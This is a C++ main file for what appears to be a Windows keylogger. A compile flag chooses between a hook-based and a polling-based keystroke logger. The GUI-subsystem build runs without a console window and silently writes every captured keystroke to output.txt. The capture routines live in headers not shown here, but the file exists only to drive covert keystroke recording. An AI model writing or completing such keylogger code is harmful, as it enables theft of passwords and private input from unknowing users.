#include <iostream>
#include <fstream>
#include <Windows.h>
#include "CharacterHandler.h"

#ifdef USE_HOOK
#include "HookKeyLogger.h"
#else
#include "LoopKeyLogger.h"
#endif

#ifdef _CONSOLE
	int main()
#else
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#endif
{
	CharacterHandler::initSpecialChars();
#ifdef _CONSOLE
	std::ostream& output = std::cout;
#else
	std::ofstream file("output.txt", std::ios::trunc);
	std::ostream& output = file;
#endif

#ifdef USE_HOOK
	hookKeyLogger::log(output);
#else
	loopKeyLogger::log(output);
#endif
	return 0;
}